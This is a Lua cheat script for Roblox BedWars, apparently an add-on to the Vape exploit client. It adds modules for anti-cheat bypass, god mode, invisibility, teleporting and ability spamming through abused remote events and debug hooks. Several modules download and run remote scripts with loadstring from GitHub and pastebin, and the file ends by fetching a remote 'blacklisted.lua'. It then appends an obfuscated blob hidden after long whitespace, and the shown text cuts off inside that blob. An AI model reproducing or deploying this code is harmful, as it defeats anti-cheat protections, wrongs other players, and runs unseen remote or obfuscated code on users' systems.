		local HeartBeatConnect2 = tick()
		local Value = HeartBeatConnect2 - (HeartBeatConnect2 - HeartBeatConnect <= 999 and 0 or 999)
		HeartBeatConnect = math.max(HeartBeatConnect,Value)
	end
	Disabler = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AnticheatBypassV2",
	    HoverText = "better AnticheatBypass reel",
        Function = function(callback)
            if callback then
				SendNotify = true
				NoDisable = true
				task.spawn(function()
					repeat
						task.wait()
						RenderSteppedConnection = game:GetService("RunService").RenderStepped:Connect(getRenderStepped)
						HeartbeatConnection = game:GetService("RunService").Heartbeat:Connect(getHeartBeat)
						local item = getItemNear("scythe")
						repeat task.wait() until item
						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then
							if DisablerMode.Value == "MoveDirection" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection
									})
								end
							elseif DisablerMode.Value == "LookVector" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
									})
								end
							end
							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
								bedwarsStore.scythe = tick() + 1
							end
						elseif item and lplr.Character.HandInvItem.Value ~= item.tool and bedwars.CombatController then
							if SendNotify then
								if DisablerNotify.Value == "Vape" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
								elseif DisablerNotify.Value == "Print" then
									print(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Warn" then
									warn(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Combined" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
									print(DisablerTable.Messages.Context3)
									warn(DisablerTable.Messages.Context3)
								end
								SendNotify = false
							end
							if DisablerMissing.Value == "Continue" then
								task.wait(DisablerTable.Values.Duration)
								SendNotify = true
								NoDisable = true
							elseif DisablerMissing.Value == "Disable" then
								NoDisable = false
							end
							if not NoDisable then
								Disabler.ToggleButton(false)
								return
							end
						elseif not item then
							if DisablerNotify.Value == "Vape" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
							elseif DisablerNotify.Value == "Print" then
								print(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Warn" then
								warn(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Combined" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
								print(DisablerTable.Messages.Context4)
								warn(DisablerTable.Messages.Context4)
							end
							Disabler.ToggleButton(false)
							return
						end
					until not Disabler.Enabled
				end)
			else
				HeartbeatConnection:Disconnect()
				RenderSteppedConnection:Disconnect()
            end
        end,
		ExtraText = function()
			return DisablerMode.Value
		end
    })
	DisablerMode = Disabler.CreateDropdown({
		Name = "Mode",
		List = {
			"MoveDirection",
			"LookVector"
		},
		HoverText = "Disabler Mode",
		Function = function() end,
	})
	DisablerMissing = Disabler.CreateDropdown({
		Name = "Missing Scythe",
		List = {
			"Continue",
			"Disable"
		},
		HoverText = "Actions that will occur when the Scythe is missing",
		Function = function() end,
	})
	DisablerNotify = Disabler.CreateDropdown({
		Name = "Notification",
		List = {
			"Vape",
			"Print",
			"Warn",
			"Combined"
		},
		HoverText = "Notification that will be displayed",
		Function = function() end,
	})
	DisablerDuration = Disabler.CreateSlider({
		Name = "Duration",
		Min = 1,
		Max = 10,
		HoverText = "Notification's Duration",
		Function = function() end,
		Default = 5
	})
	DisablerSpeedVal = Disabler.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 100,
		HoverText = "Direction Speed",
		Function = function() end,
		Default = 90
	})
	DisablerSpeed = Disabler.CreateToggle({
		Name = "Speed",
		Default = true,
		HoverText = "Adds speed to the direction",
		Function = function() end,
	})
	DisablerNotification = Disabler.CreateToggle({
		Name = "Notification",
		Default = true,
		HoverText = "Notifies you when certain actions happen",
		Function = function() end,
	})
end)

local Nebula = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
	["Name"] = "NebulaSky",
	["Function"] = function(callback)
		if callback then
			task.spawn(function() 

				local Vignette = true


				local Lighting = game:GetService("Lighting")
				local ColorCor = Instance.new("ColorCorrectionEffect")
				local SunRays = Instance.new("SunRaysEffect")
				local Sky = Instance.new("Sky")
				local Atm = Instance.new("Atmosphere")


				for i, v in pairs(Lighting:GetChildren()) do
					if v then
						v:Destroy()
					end
				end

				ColorCor.Parent = Lighting
				SunRays.Parent = Lighting
				Sky.Parent = Lighting
				Atm.Parent = Lighting

				if Vignette == true then
					local Gui = Instance.new("ScreenGui")
					Gui.Parent = StarterGui
					Gui.IgnoreGuiInset = true

					local ShadowFrame = Instance.new("ImageLabel")
					ShadowFrame.Parent = Gui
					ShadowFrame.AnchorPoint = Vector2.new(0,1,0)
					ShadowFrame.Position = UDim2.new(0,0,0,0)
					ShadowFrame.Size = UDim2.new(0,0,0,0)
					ShadowFrame.BackgroundTransparency = 1
					ShadowFrame.Image = ""
					ShadowFrame.ImageTransparency = 1
					ShadowFrame.ZIndex = 0
				end


				ColorCor.Brightness = 0.1
				ColorCor.Contrast = 0.5
				ColorCor.Saturation = -0.3
				ColorCor.TintColor = Color3.fromRGB(255, 235, 203)

				SunRays.Intensity = 0.075
				SunRays.Spread = 0.727

				Sky.SkyboxBk = "rbxassetid://13581437029"
				Sky.SkyboxDn = "rbxassetid://13581439832"
				Sky.SkyboxFt = "rbxassetid://13581447312"
				Sky.SkyboxLf = "rbxassetid://13581443463"
				Sky.SkyboxRt = "rbxassetid://13581452875"
				Sky.SkyboxUp = "rbxassetid://13581450222"
				Sky.SunAngularSize = 10

				Lighting.Ambient = Color3.fromRGB(2,2,2)
				Lighting.Brightness = 0.3
				Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
				Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
				Lighting.EnvironmentDiffuseScale = 0.2
				Lighting.EnvironmentSpecularScale = 0.2
				Lighting.GlobalShadows = true
				Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
				Lighting.ShadowSoftness = 0.2
				Lighting.ClockTime = 15
				Lighting.GeographicLatitude = 45
				Lighting.ExposureCompensation = 0.5

				Atm.Density = 0.364
				Atm.Offset = 0.556
				Atm.Color = Color3.fromRGB(179, 59, 249)
				Atm.Decay = Color3.fromRGB(155, 212, 255)
				Atm.Glare = 0.36
				Atm.Haze = 1.72	
                end)
			end
		end
    })

runFunction(function()
		local Reinject = {["Enabled"] = false}
		Reinject = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Reinject",
			["HoverText"] = "Reinjects Vape To Load Modules",
			   ["Function"] = function(Callback)
					Enabled = Callback
					if Enabled then
						Reinject["ToggleButton"](false)
						GuiLibrary["SelfDestruct"]()
						loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
	
	
					end
				end
		})
	end)

runFunction(function()
   Pink = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
	["Name"] = "PinkTheme",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				for i,v in pairs(lightingService:GetChildren()) do
					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
						v:Remove()
					end
				end
				local sky = Instance.new("Sky")
				sky.SkyboxBk = "rbxassetid://1546230803"
				sky.SkyboxDn = "rbxassetid://1546231143"
				sky.SkyboxFt = "rbxassetid://1546230803"
				sky.SkyboxLf = "rbxassetid://1546230803"
				sky.SkyboxRt = "rbxassetid://1546230803"
				sky.SkyboxUp = "rbxassetid://1546230451"
				sky.Parent = lightingService
				pcall(function() workspace.Clouds:Destroy() end)
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(255, 132, 178)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(0, 0, 0))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				local colorcorrection = Instance.new("ColorCorrectionEffect")
				colorcorrection.TintColor = Color3.fromRGB(255, 199, 220)
				colorcorrection.Brightness = 0.05
				colorcorrection.Parent = lightingService
				debug.setconstant(require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["hotbar-healthbar"]).HotbarHealthbar.render, 16, 16745650)
			end)
		end
	end
})
end)

runFunction(function()
        local FlyGui = {Enabled = false}
        FlyGui = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
            Name = "FlyLoader",
            HoverText = "Loads FlyGui credits to Red",
            Function = function(callback)
                if callback then
                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        loadstring(game:HttpGet(('https://pastebin.com/raw/h5QDPy6s'),true))()
						FlyGui.ToggleButton(false)
						warningNotification("APE", "Fly Gui Should Be Loaded Up", 5)
					else
                end
            end
		end
    })
end)

	runFunction(function()
		local InfiniteYield = {Enabled = false}
		InfiniteYield = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "InfiniteYield",
			Function = function(callback)
				if callback then
					task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
					InfiniteYield["ToggleButton"](false)
					warningNotification("APE", "Loaded Infinite Yield!", 5)
					end)
				end
			end,
			HoverText = "infinite yield lel"
		})
	end)

runFunction(function()
	local AnimationPlayer = {Enabled = false}
	local AnimationPlayerBox = {Value = "11335949902"}
	local AnimationPlayerSpeed = {Speed = 1}
	local playedanim
	AnimationPlayer = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "InvisibleExploit",
		HoverText = "put you underground",
		Function = function(callback)
			if callback then 
				if entityLibrary.isAlive then 
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
                        lplr.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
                        lplr.Character.HumanoidRootPart.Size = Vector3.new(2, 3, 1.1)
						
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(0 / 10)
						table.insert(AnimationPlayer.Connections, playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end))
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end
				table.insert(AnimationPlayer.Connections, lplr.CharacterAdded:Connect(function()
					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
					task.wait(0.5)
					if not AnimationPlayer.Enabled then return end
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(AnimationPlayerSpeed.Value / 10)
						playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end)
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end))
			else
				if playedanim then playedanim:Stop() playedanim = nil end
			end
		end
	})
end)

	runFunction(function()
		local HostPanelExploit = {Enabled = false}
		local oldhostattribute = nil
		HostPanelExploit = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "VisualHostPanel",
			HoverText = "only visual",
			Function = function(callback)
				task.spawn(function()
					if oldhostattribute == nil then 
						oldhostattribute = (lplr:GetAttribute("Cohost") or lplr:GetAttribute("Host")) and true or false
					end
					if not callback and bedwars.ClientStoreHandler:getState().Game.customMatch and oldhostattribute then 
						return
					end
					lplr:SetAttribute("Cohost", callback)
				end)
			end
		})
	end)

runFunction(function()
    local AutoSkywars = {Enabled = false}
    AutoSkywars = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AutoSkywars",
	HoverText = "tp you to middle sometimes works (only skywars)",
        Function = function(callback)
            if callback then
                task.spawn(function()
                    if bedwarsStore.queueType:find("skywars") then
                        if bedwarsStore.matchState ~= 0 then return end
                        repeat task.wait() until bedwarsStore.matchState ~= 0
                        if (not AutoSkywars.Enabled) then return end
                        task.wait(0.1)
                        local tween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {CFrame = workspace.SpectatorPlatform.floor.CFrame - Vector3.new(0,1.5,5)})
                        tween:Play()
                        tween.Completed:Wait()
                        task.wait(0.5)
                        workspace.SpectatorPlatform.floor.CanCollide = false
                    end
                end)
            end
        end
    })
end)

function IsAlive(plr)
    plr = plr or lplr
    if not plr.Character then return false end
    if not plr.Character:FindFirstChild("Head") then return false end
    if not plr.Character:FindFirstChild("Humanoid") then return false end
    if plr.Character:FindFirstChild("Humanoid").Health < 0.11 then return false end
    return true
end

runFunction(function()
    local GodMode = {Enabled = false}
    GodMode = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "PartialGodMode",
        Function = function(callback)
            if callback then
				spawn(function()
					while task.wait() do
						if (not GodMode.Enabled) then return end
						if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) then
							for i, v in pairs(game:GetService("Players"):GetChildren()) do
								if v.Team ~= lplr.Team and IsAlive(v) and IsAlive(lplr) then
									if v and v ~= lplr then
										local TargetDistance = lplr:DistanceFromCharacter(v.Character:FindFirstChild("HumanoidRootPart").CFrame.p)
										if TargetDistance < 25 then
											if not lplr.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity") then
												repeat task.wait() until bedwarsStore.matchState ~= 0
												if not (v.Character.HumanoidRootPart.Velocity.Y < -10*5) then
													lplr.Character.Archivable = true
			
													local Clone = lplr.Character:Clone()
													Clone.Parent = workspace
													Clone.Head:ClearAllChildren()
													gameCamera.CameraSubject = Clone:FindFirstChild("Humanoid")
				
													for i,v in pairs(Clone:GetChildren()) do
														if string.lower(v.ClassName):find("part") and v.Name ~= "HumanoidRootPart" then
															v.Transparency = 1
														end
														if v:IsA("Accessory") then
															v:FindFirstChild("Handle").Transparency = 1
														end
													end
				
													lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0,100000,0)
				
													game:GetService("RunService").RenderStepped:Connect(function()
														if Clone ~= nil and Clone:FindFirstChild("HumanoidRootPart") then
															Clone.HumanoidRootPart.Position = Vector3.new(lplr.Character.HumanoidRootPart.Position.X, Clone.HumanoidRootPart.Position.Y, lplr.Character.HumanoidRootPart.Position.Z)
														end
													end)
				
													task.wait(0.3)
													lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X, -1, lplr.Character.HumanoidRootPart.Velocity.Z)
													lplr.Character.HumanoidRootPart.CFrame = Clone.HumanoidRootPart.CFrame
													gameCamera.CameraSubject = lplr.Character:FindFirstChild("Humanoid")
													Clone:Destroy()
													task.wait(0.15)
												end
											end
										end
									end
								end
							end
						end
					end
				end)
			end
        end
    })
end)

	runFunction(function()
		local AutoEmber = {Enabled = false}
		AutoEmber = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "4BigGuysExploit",
			HoverText = "Automatically uses the ember ability.",
			Function = function(callback)
				if callback then 
					task.spawn(function()
						repeat 
							local saber = getItem("infernal_saber")
							if killauraNearPlayer and saber then 
								bedwars.ClientHandler:Get("HellBladeRelease"):SendToServer({chargeTime = 0.5, player = lplr, weapon = saber.tool})
							end
							task.wait()
						until not AutoEmber.Enabled
					end)
				end
			end
		})
	end)
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/blacklisted.lua"))()

warningNotification("APE", "Loaded Succesfully By RayHafz!", 5)
																																																																						
do local a=[[77fuscator 0.5.0 - discord.gg/CEHsVcBcuf]];return(function(b,c,d,e,f,f,g,h,i,j,k,l,l,m,n,o,p,q,r,s,t,u,u,v,w,w,x,y,y,z,z,z,ba,ba,bb,bb,bb,bc)local bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cp,cq,cr=0 while true do if bd<=17 then if bd<=8 then if bd<=3 then if bd<=1 then if bd>0 then bl=1 else be,bf,bg,bh,bi,bj,bk=string.sub,table.concat,string.char,tonumber,next,(table.create or function(cs,ct)local cu={};for cv=1,cs do cu[cv]=ct;end;return cu;end)or tostring end else if 2==bd then bm=function(bi)local bk,cs,ct,cu,cv,cw,cx,cy=0 while true do if bk<=5 then if bk<=2 then if bk<=0 then cs,ct=g,g else if 1==bk then cu=bj(#bi)else cv=256 end end else if bk<=3 then cw=bj(cv)else if 5~=bk then for bj=0,(cv-1)do cw[bj]=bg(bj)end else cx=1 end end end else if bk<=8 then if bk<=6 then cy=function()local bj,cz,da=0 while true do if bj<=2 then if bj<=0 then cz=bh(be(bi,cx,cx),36)else if 1<bj then da=bh(be(bi,cx,(cx+cz-1)),36)else cx=cx+1 end end else if bj<=3 then cx=(cx+cz)else if bj~=5 then return da else break end end end bj=bj+1 end end else if 8>bk then cs=bg(cy())else cu[1]=cs end end else if bk<=9 then while(cx<#bi and#a==d)do local a=cy()if cw[a]then ct=cw[a]else ct=(cs..be(cs,1,1))end cw[cv]=(cs..be(ct,1,1))cu[#cu+1],cs,cv=ct,ct,(cv+1)end else if bk<11 then return bf(cu)else break end end end end bk=bk+1 end end else bn=bm(b)end end else if bd<=5 then if 4==bd then bo={}else c={y,j,l,w,x,k,u,o,s,m,i,q,nil,nil,nil};end else if bd<=6 then bp=v else if 8~=bd then bq=bp(bo)else br,bs=1,(-3503+(function()local a,b,c,d=0 while true do if a<=1 then if 0<a then d=(function(q,s,v)local w=0 while true do if 0<w then break else v(v(q and v,(s and s),q),v(q,v,v),q(s,(s and v),s))end w=w+1 end end)(function(q,s,v)local w=0 while true do if w<=2 then if w<=0 then if(b>149)then return q end else if 1==w then b=(b+1)else c=((c*715))%48827 end end else if w<=3 then if((c%1796)<=898)then return q else return s(s(s,v,v),(q(v,q,q)and v(s,s,s)),v((s and q),v,q))end else if w~=5 then return q(s(s,q,q),(q(q,q,v)and v(s,v,v)),(s(v,(q and v),v)and s(q,s,s)))else break end end end w=w+1 end end,function(q,s,v)local w=0 while true do if w<=2 then if w<=0 then if(b>220)then return q end else if 1<w then c=(c-269)%12029 else b=b+1 end end else if w<=3 then if(((c%1652))==826 or((c%1652))>826)then return q(s(v,q,(q and s)),q(v,(v and q),(q and q)),(v(v,s,s and q)and v(s,v,v)))else return s end else if 5>w then return q else break end end end w=w+1 end end,function(q,s,v)local w=0 while true do if w<=2 then if w<=0 then if b>487 then return v end else if 1==w then b=(b+1)else c=(((c+631))%9162)end end else if w<=3 then if(c%1260)<=630 then return v else return v(v(s,(s and v),q),(q(v,q,v and v)and v(s,v,s)),s(s,s,s))end else if 5>w then return s(s(s and s,v and v,v),q(q,q and q,(q and q)),v(v and v,v,s))else break end end end w=w+1 end end)else b,c=0,1 end else if a>2 then break else return c;end end a=a+1 end end)())end end end end else if bd<=12 then if bd<=10 then if 9==bd then bt={}else bu=function(a,b)local c,d=0 while true do if c<=1 then if c==0 then d=0 else for q=0,31 do local s=a%2 local v=(b%2)if(s==0)then if not(v~=1)then b=(b-1)d=d+(2^q)end else a=a-1 if not(v~=0)then d=(d+2^q)else b=(b-1)end end b=b/2 a=(a/2)end end else if c~=3 then return d else break end end c=c+1 end end end else if bd~=12 then bv=function(a,b)local c=0 while true do if c<1 then return((a*2^b));else break end c=c+1 end end else bw=function()local a,b,c=0 while true do if a<=1 then if 0<a then b,c=bu(b,bs),bu(c,bs);else b,c=h(bn,br,br+2)end else if a<=2 then br=br+2;else if 3<a then break else return((bv(c,8))+b);end end end a=a+1 end end end end else if bd<=14 then if 13==bd then do for a,b in o,l(bl)do bt[a]=b;end;end;else bx=bt end else if bd<=15 then by=function(a,b)local c=0 while true do if 0<c then break else return p((a/2^b));end c=c+1 end end else if 16==bd then bz=2^32-1 else ca=function(a,b)local c=0 while true do if c<1 then return(((a+b)-bu(a,b)))/2 else break end c=c+1 end end end end end end end else if bd<=26 then if bd<=21 then if bd<=19 then if 18<bd then cc=function(a,b)local c=0 while true do if 0<c then break else return(bz-ca((bz-a),bz-b))end c=c+1 end end else cb=bw()end else if bd>20 then ce=bw()else cd=function(a,b,c)local d=0 while true do if d~=1 then if c then local c=(a/2^(b-1))%(2^((c-1)-(b-1)+1))return(c-c%1)else local b=(2^(b-1))return((a%(b+b)>=b)and 1 or 0)end else break end d=d+1 end end end end else if bd<=23 then if bd>22 then cg=function()local a,b=0 while true do if a<=1 then if a>0 then br=br+1;else b=bu(h(bn,br,br),cb)end else if a>2 then break else return b;end end a=a+1 end end else cf=function()local a,b,c,d,p=0 while true do if a<=1 then if a>0 then b,c,d,p=bu(b,cb),bu(c,cb),bu(d,cb),bu(p,cb);else b,c,d,p=h(bn,br,(br+3))end else if a<=2 then br=(br+4);else if a>3 then break else return((bv(p,24)+bv(d,16)+bv(c,8))+b);end end end a=a+1 end end end else if bd<=24 then ch,ci,cj=nil else if 25<bd then ci=((-25303+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a~=1 then b=40425 else c=236 end else if a<=2 then d=960 else if 4>a then p=1920 else q=33223 end end end else if a<=7 then if a<=5 then s=2 else if 7~=a then v=894 else w=201 end end else if a<=8 then x=3 else if a~=10 then y=1330 else be=5906 end end end end else if a<=15 then if a<=12 then if 11<a then bg=665 else bf=617 end else if a<=13 then bh=211 else if a==14 then bi=33389 else bj=787 end end end else if a<=18 then if a<=16 then bk=1 else if 18>a then bs=0 else bw,by=bs,bk end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if ce==0 then cc(cc(ca,ca),ca(cc,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bh then local bh=bs while true do bh=bh+bk if not(bh~=bk)then return cc else break end end end else if 1==ce then bw=(bw+bk)else by=((by-bj)%bi)end end else if ce<=3 then if(by%y)<bg then local y=bs while true do y=(y+bk)if(y==bk or y<bk)then by=(by*bf)%be else if not(y~=x)then break else return cc(cc(cc,cc),(ca(cc,cc)and cc(ca,cc)))end end end else local y=bs while true do y=(y+bk)if not(y~=s)then break else return cc end end end else if ce<5 then return cc else break end end end ce=ce+1 end end,function(y,be)local bf=0 while true do if bf<=2 then if bf<=0 then if(bw>w)then local w=bs while true do w=(w+bk)if not(not(w==s))then break else return be end end end else if bf==1 then bw=(bw+bk)else by=((by+v)%q)end end else if bf<=3 then if((by%p)>d)then local d=bs while true do d=(d+bk)if(d<bk or d==bk)then by=((by*c)%b)else if not(not(d==x))then break else return be(y(y,be and y),be(be,y))end end end else local b=bs while true do b=(b+bk)if b>bk then break else return y end end end else if 5~=bf then return y else break end end end bf=bf+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)()));else ch=((-14488+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a>0 then c=48533 else b=526 end else if a<=2 then d=3 else if a~=4 then p=270 else q=540 end end end else if a<=7 then if a<=5 then s=12318 else if 7>a then v=385 else w=137 end end else if a<=8 then x=35083 else if a==9 then y=254 else be=340 end end end end else if a<=15 then if a<=12 then if 11<a then bg=170 else bf=2 end else if a<=13 then bh=19255 else if 15~=a then bi=1 else bj=423 end end end else if a<=18 then if a<=16 then bk=240 else if a==17 then bs=0 else bw,by=bs,bi end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if 1~=ce then cc(ca(ca,ca)and ca(ca,ca),cc(cc,(ca and ca))and cc(ca,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bk then local bk=bs while true do bk=(bk+bi)if not(bk~=bi)then return cc else break end end end else if 2>ce then bw=(bw+bi)else by=((by-bj)%bh)end end else if ce<=3 then if((by%be)<bg)then local be=bs while true do be=(be+bi)if((be>bf)or be==bf)then if(be<d)then return cc(ca(ca,(ca and cc)),cc(ca,ca))else break end else by=(by+y)%x end end else local x=bs while true do x=(x+bi)if(x<bf)then return cc else break end end end else if ce<5 then return ca else break end end end ce=ce+1 end end,function(x,y)local be=0 while true do if be<=2 then if be<=0 then if(bw>w)then local w=bs while true do w=w+bi if not(w~=bf)then break else return x end end end else if 2~=be then bw=bw+bi else by=((by*v)%s)end end else if be<=3 then if((by%q)>p)then local p=bs while true do p=(p+bi)if(p==bi or p<bi)then by=(by*b)%c else if not(not(p==d))then break else return x(y(x,y),x(y,x))end end end else local b=bs while true do b=b+bi if(b<bf)then return x else break end end end else if be~=5 then return y else break end end end be=be+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)()));end end end end else if bd<=31 then if bd<=28 then if 28~=bd then cj=((-1671+(function()local a=409;local b=818;local c=28939;local d=222;local p=389;local q=38485;local s=1166;local v=583;local w=9454;local x=425;local y=4509;local be=442;local bf=292;local bg=3;local bh=1696;local bi=848;local bj=579;local bk=10108;local bs=252;local bw=908;local by=5205;local bz=470;local ca=746;local cc=1816;local ce=18568;local cs=2;local ct=1;local cu=421;local cv=0;local cw,cx=cv,ct;local a=(function(cy,cz,da,db)cy(cz(db,db,da,db),da(cz,cy,cz,db),da(da,cz,da,da),db(cz and cy,db,da,da))end)(function(cy,cz,da,db)if(cw>cu)then local cu=cv while true do cu=(cu+ct)if(cu<cs)then return cz else break end end end cw=cw+ct cx=(cx+ca)%ce if((cx%cc)==bw or(cx%cc)>bw)then local bw=cv while true do bw=bw+ct if(bw==ct or bw<ct)then cx=(cx-bz)%by else if not(bw~=cs)then return cz(cy(da,cy,cy,(cz and da)),da(cz,cz,cy,(da and db)),da(cy,db,cy,da),(cy(da,(db and cz),cz and da,cy)and cy((da and db),da and cy,db,da)))else break end end end else local bw=cv while true do bw=bw+ct if not(bw~=cs)then break else return cy end end end return cz end,function(bw,by,ca,cc)if cw>bs then local bs=cv while true do bs=bs+ct if not(bs~=cs)then break else return bw end end end cw=cw+ct cx=((cx-bj)%bk)if((cx%bh)==bi or(cx%bh)>bi)then local bh=cv while true do bh=bh+ct if(bh==cs or bh>cs)then if(bh<bg)then return ca else break end else cx=(cx*bf)%y end end else local y=cv while true do y=(y+ct)if(y<cs)then return bw(by(cc and by,bw and by,(ca and bw),bw),(cc(by,cc,by,(ca and cc))and ca(ca,cc,ca,ca)),ca(cc,bw and cc,bw,cc)and by(bw,bw and bw,ca,by),ca(ca,cc,(by and cc),ca))else break end end end return bw(ca(ca,by,ca and bw,cc),cc(ca,ca,cc,bw),bw(cc,cc,by,bw),by(bw,(bw and 